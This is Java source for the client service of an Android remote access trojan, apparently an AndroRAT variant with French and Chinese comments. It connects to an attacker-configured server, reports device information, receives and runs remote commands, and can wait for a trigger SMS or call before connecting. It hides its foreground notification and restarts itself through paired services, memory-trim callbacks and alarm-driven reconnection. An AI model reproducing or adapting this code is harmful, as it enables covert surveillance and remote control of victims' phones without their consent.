package my.app.client;

import inout.Controler;
import inout.Protocol;

import java.util.Calendar;

import my.app.Library.SystemInfo;
import my.app.client.service.StartService;
import my.app.client.service.StrongService;
import out.Connection;
import service.MyJobService;
import utils.LogToFile;
import utils.Utils;
import Packet.CommandPacket;
import Packet.LogPacket;
import Packet.PreferencePacket;
import Packet.TransportPacket;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.RemoteException;
import android.util.Log;
import android.widget.Toast;

public class Client extends ClientListener implements Controler {

	public final String TAG = Client.class.getSimpleName();
	Connection conn;

	int nbAttempts = 10; // sera décrementé a 5 pour 5 minute 3 pour 10 minute
							// ..
	int elapsedTime = 1; // 1 minute

	boolean stop = false; // Pour que les threads puissent s'arreter en cas de
							// déconnexion

	boolean isOnCreate = false;
	boolean isRunning = false; // Le service tourne
	boolean isListening = false; // Le service est connecté au serveur
	// final boolean waitTrigger = false; //On attend un évenement pour essayer
	// de se connecter.
	Thread readthread;
	ProcessCommand procCmd;
	byte[] cmd;
	CommandPacket packet;

	private Handler handler = new Handler() {

		public void handleMessage(Message msg) {
			Bundle b = msg.getData();
			processCommand(b);
		}
	};

	public void onCreate() {
		LogToFile.e(TAG, "In onCreate");
		Log.e(TAG, "In onCreate");
		infos = new SystemInfo(this);
		procCmd = new ProcessCommand(this);

		loadPreferences();
		isOnCreate = true;
//		Toast.makeText(getApplicationContext(), "onCreate", Toast.LENGTH_SHORT)
//				.show();

		
		Toast.makeText(Client.this, "Client 启动中...", Toast.LENGTH_SHORT).show();
		startService1();
		/*
		 * 此线程用监听Service2的状态
		 */
		new Thread() {
			public void run() {
				while (true) {
					boolean isRun = Utils.isServiceWork(Client.this,
							"my.app.client.service.StartService");
					if (!isRun) {
						Message msg = Message.obtain();
						msg.what = 1;
						handler1.sendMessage(msg);
					}
					try {
						Thread.sleep(1);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
			};
		}.start();
		
	}

	private final static int GRAY_SERVICE_ID = 1001;

	// 给API >= 18 的平台上做灰色保护手段
	public class GrayInnerService extends Service {
		@Override
		public IBinder onBind(Intent intent) {
			return null;
		}

		@Override
		public int onStartCommand(Intent intent, int flags, int startId) {
			startForeground(GRAY_SERVICE_ID, new Notification());
			stopForeground(true);
			stopSelf();

			return super.onStartCommand(intent, flags, startId);
		}
	}

	private ConnectivityManager connectivityManager;
	private NetworkInfo info;
	
	
	public boolean mReceiverTag2 = false;   //广播接受者标识
	private BroadcastReceiver mReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			
			if (!mReceiverTag2){   
				mReceiverTag2 = true;
				String action = intent.getAction();
				if (action.equals(ConnectivityManager.CONNECTIVITY_ACTION)) {
					LogToFile.d("Client-mReceiver", "网络状态已经改变");
					Log.d("Client-mReceiver", "网络状态已经改变");
					connectivityManager = (ConnectivityManager)
	
					getSystemService(Context.CONNECTIVITY_SERVICE);
					info = connectivityManager.getActiveNetworkInfo();
					if (info != null && info.isAvailable()) {
						String name = info.getTypeName();
						LogToFile.e("Client-mReceiver", "当前网络名称：" + name);
						Log.e("Client-mReceiver", "当前网络名称：" + name);
						Intent serviceIntent = new Intent();
						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
							serviceIntent.setClass(context, MyJobService.class);
						} else {
							serviceIntent.setClass(context, Client.class);
						}
						context.startService(serviceIntent);
	
					} else {
						LogToFile.e("Client-mReceiver", "没有可用网络");
						Log.e("Client-mReceiver", "没有可用网络");
					}
				}
			}
		}
	};

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		if (conn!=null&&!conn.sendMsg()&&isOnCreate) {
			//链接断开重连
			Log.e("TAG", "链接断开重连" + conn + "---conn.sendMsg()="+conn.sendMsg() + "---isOnCreate=" + isOnCreate);
			LogToFile.e("TAG", "链接断开重连" + conn + "---conn.sendMsg()="+conn.sendMsg() + "---isOnCreate=" + isOnCreate);
			stopSelf();
			
		}else{
			if(conn!=null){
				Log.e("TAG", "链接正常" + conn + "---conn.sendMsg()="+conn.sendMsg() + "---isOnCreate=" + isOnCreate);
				
				LogToFile.e("TAG", "链接正常" + conn + "---conn.sendMsg()="+conn.sendMsg() + "---isOnCreate=" + isOnCreate);
//				return super.onStartCommand(intent, flags, startId);
			}else{
				Log.e("TAG", "conn" + conn +  "---isOnCreate=" + isOnCreate);
				
				LogToFile.e("TAG", "conn" + conn +  "---isOnCreate=" + isOnCreate);
			}
		}
		
		IntentFilter mFilter = new IntentFilter();
		mFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
		registerReceiver(mReceiver, mFilter);

		// toast = Toast.makeText(this ,"Prepare to laod", Toast.LENGTH_LONG);
		// loadPreferences("preferences");
		// Intent i = new Intent(this,Preferences.class);
		// startActivity(i);

		// API < 18,此方法能有效地隐藏notification的图标
		if (Build.VERSION.SDK_INT < 18) {
			startForeground(GRAY_SERVICE_ID, new Notification());
		} else {
			Intent intent1 = new Intent(this, GrayInnerService.class);
			startService(intent1);
			startForeground(GRAY_SERVICE_ID, new Notification());
		}
		// return super.onStartCommand(intent, flags, startId);

		if (intent == null){
			Log.e(TAG, "intent==null");
			return super.onStartCommand(intent, flags, startId);// return
																// START_STICKY;
		}
			
		String who = intent.getAction();
		Log.e(TAG, "onStartCommand by: " + who);
		LogToFile.e(TAG, "onStartCommand by: " + who); // On affiche qui a déclenché
													// l'event

		if (intent.hasExtra("IP"))
			this.ip = intent.getExtras().getString("IP");
		if (intent.hasExtra("PORT"))
			this.port = intent.getExtras().getInt("PORT");

		LogToFile.e(TAG, "this.ip:" + this.ip + "+this.port:" + this.port);
		if (!isRunning) {// C'est la première fois qu'on le lance

			// --- On ne passera qu'une fois ici ---
			IntentFilter filterc = new IntentFilter(
					"android.net.conn.CONNECTIVITY_CHANGE"); // Va monitorer la
																// connexion
			registerReceiver(ConnectivityCheckReceiver, filterc);
			isRunning = true;
			conn = new Connection(ip, port, this);// On se connecte et on lance
													// les threads

			if (waitTrigger) { // On attends un evenement pour se connecter au
								// serveur
				// On ne fait rien
				registerSMSAndCall();
			} else {
				LogToFile.e(TAG, "Try to connect to " + ip + ":" + port);
				if (conn.connect()) {
					packet = new CommandPacket();
					readthread = new Thread(new Runnable() {
						public void run() {
							waitInstruction();
						}
					});
					readthread.start(); // On commence vraiment a écouter
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0,
							infos.getBasicInfos());
					handleData(0, pack.build());
					// gps = new GPSListener(this,
					// LocationManager.NETWORK_PROVIDER,(short)4);
					// //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
					isListening = true;
					if (waitTrigger) {
						unregisterReceiver(SMSreceiver); // On désenregistre SMS
															// et Call pour
															// éviter tout appel
															// inutile
						unregisterReceiver(Callreceiver);
						waitTrigger = false;
					}
				} else {
					if (isConnected) { // On programme le AlarmListener car y a
										// un probleme coté serveur
						resetConnectionAttempts();
						reconnectionAttempts();
					} else { // On attend l'update du ConnectivityListener pour
								// se débloquer
						LogToFile.e(TAG, "Not Connected wait a Network update");
					}
				}
			}
		} else { // Le service a déjà été lancé
			if (isListening) {
				LogToFile.e(TAG, "Called uselessly by: " + who
						+ " (already listening)");
			} else { // Sa veut dire qu'on a reçu un broadcast sms ou call
						// On est ici soit par AlarmListener,
						// ConnectivityManager, SMS/Call ou X
						// Dans tout les cas le but ici est de se connecter
				LogToFile.i(TAG, "Connection by : " + who);
				if (conn.connect()) {
					readthread = new Thread(new Runnable() {
						public void run() {
							waitInstruction();
						}
					});
					readthread.start(); // On commence vraiment a écouter
					CommandPacket pack = new CommandPacket(Protocol.CONNECT, 0,
							infos.getBasicInfos());
					handleData(0, pack.build());
					isListening = true;
					if (waitTrigger) {
						unregisterReceiver(SMSreceiver);
						unregisterReceiver(Callreceiver);
						waitTrigger = false; // In case of disconnect does not
												// wait again for a trigger
					}
				} else {// On a encore une fois pas réussi a se connecter
					reconnectionAttempts(); // Va relancer l'alarmListener
				}
			}
		}

		return super.onStartCommand(intent, flags, startId);
	}

	public void waitInstruction() { // Le thread sera bloqué dedans
		try {
			for (;;) {
				if (stop)
					break;
				conn.getInstruction();
			}
		} catch (Exception e) {
			isListening = false;
			resetConnectionAttempts();
			reconnectionAttempts();
			if (waitTrigger) {
				registerSMSAndCall();
			}
		}
	}

	public void processCommand(Bundle b) {
		try {
			procCmd.process(b.getShort("command"), b.getByteArray("arguments"),
					b.getInt("chan"));
		} catch (Exception e) {
			LogToFile.e(TAG, "Error on Client  +processCommand");
			Log.e(TAG, "Error on Client  +processCommand");
			sendError("Error on Client:" + e.getMessage());
		}
	}

	public void reconnectionAttempts() {
		/*
		 * 10 fois toute les minutes 5 fois toutes les 5 minutes 3 fois toute
		 * les 10 minutes 1 fois au bout de 30 minutes
		 */
		if (!isConnected)
			return;

		if (nbAttempts == 0) {
			switch (elapsedTime) {
			case 1:
				elapsedTime = 5;
				break;
			case 5:
				elapsedTime = 10;
				break;
			case 10:
				elapsedTime = 30;
				break;
			case 30:
				return; // Did too much try
			}
		}
		// ---- Piece of Code ----
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, elapsedTime);

		Intent intent = new Intent(this, AlarmListener.class);

		intent.putExtra("alarm_message", "Wake up Dude !");

		PendingIntent sender = PendingIntent.getBroadcast(this, 0, intent,
				PendingIntent.FLAG_UPDATE_CURRENT);
		// Get the AlarmManager service
		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);

		// -----------------------
		nbAttempts--;
	}

	public void loadPreferences() {
		PreferencePacket p = procCmd.loadPreferences();
		waitTrigger = p.isWaitTrigger();
		ip = p.getIp();
		port = p.getPort();
		authorizedNumbersCall = p.getPhoneNumberCall();
		authorizedNumbersSMS = p.getPhoneNumberSMS();
		authorizedNumbersKeywords = p.getKeywordSMS();
	}

	public void sendInformation(String infos) { // Methode que le Client doit
												// implémenter pour envoyer des
												// informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 0,
				infos).build());
	}

	public void sendError(String error) { // Methode que le Client doit
											// implémenter pour envoyer des
											// informations
		conn.sendData(1, new LogPacket(System.currentTimeMillis(), (byte) 1,
				error).build());
	}

	public void handleData(int channel, byte[] data) {
		conn.sendData(channel, data);
	}

	public void onDestroy() {
		// savePreferences("myPref");
		// savePreferences("preferences");

		LogToFile.i(TAG, "in onDestroy");
		Log.i(TAG, "in onDestroy");
		if (mReceiverTag) {
            mReceiverTag = false;
            this.unregisterReceiver(ConnectivityCheckReceiver);
		}
		
		if (mReceiverTag2) {
			mReceiverTag2 = false;
			unregisterReceiver(mReceiver);
		}
		conn.stop();
		stop = true;
		stopSelf();
		super.onDestroy();
	}

	public void resetConnectionAttempts() {
		nbAttempts = 10;
		elapsedTime = 1;
	}

	public void registerSMSAndCall() {
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED"); // On
																		// enregistre
																		// un
																		// broadcast
																		// receiver
																		// sur
																		// la
																		// reception
																		// de
																		// SMS
		registerReceiver(SMSreceiver, filter);
		IntentFilter filter2 = new IntentFilter();
		filter2.addAction("android.intent.action.PHONE_STATE");// TelephonyManager.ACTION_PHONE_STATE_CHANGED);
																// //On
																// enregistre un
																// broadcast
																// receiver sur
																// la reception
																// de SMS
		registerReceiver(Callreceiver, filter2);
	}

	public void Storage(TransportPacket p, String i) {
		try {
			packet = new CommandPacket(); // !!!!!!!!!!!! Sinon on peut surement
											// en valeur les arguments des
											// command précédantes !
			packet.parse(p.getData());

			Message mess = new Message();
			Bundle b = new Bundle();
			b.putShort("command", packet.getCommand());
			b.putByteArray("arguments", packet.getArguments());
			b.putInt("chan", packet.getTargetChannel());
			mess.setData(b);
			handler.sendMessage(mess);
		} catch (Exception e) {
			System.out.println("Androrat.Client.storage : pas une commande");
		}
	}
	
	
	
	private Handler handler1 = new Handler() {
		public void handleMessage(android.os.Message msg) {
			switch (msg.what) {
			case 1:
				startService1();
				break;

			default:
				break;
			}

		};
	};

	/**
	 * 使用aidl 启动Service1
	 */
	private StrongService startS1 = new StrongService.Stub() {

		@Override
		public void stopService() throws RemoteException {
			Intent i = new Intent(getBaseContext(), StartService.class);
			getBaseContext().stopService(i);
		}

		@Override
		public void startService() throws RemoteException {
			Intent i = new Intent(getBaseContext(), StartService.class);
			getBaseContext().startService(i);

		}
	};

	/**
	 * 在内存紧张的时候，系统回收内存时，会回调OnTrimMemory， 重写onTrimMemory当系统清理内存时从新启动Service1
	 */
	@Override
	public void onTrimMemory(int level) {
		startService1();
	}


	/**
	 * 判断Service1是否还在运行，如果不是则启动Service1
	 */
	private void startService1() {
		boolean isRun = Utils.isServiceWork(Client.this,
				"my.app.client.service.StartService");
		if (isRun == false) {
			try {
				startS1.startService();
			} catch (RemoteException e) {
				e.printStackTrace();
			}
		}
	}


	@Override
	public IBinder onBind(Intent intent) {
		return (IBinder) startS1;
	}
	
}
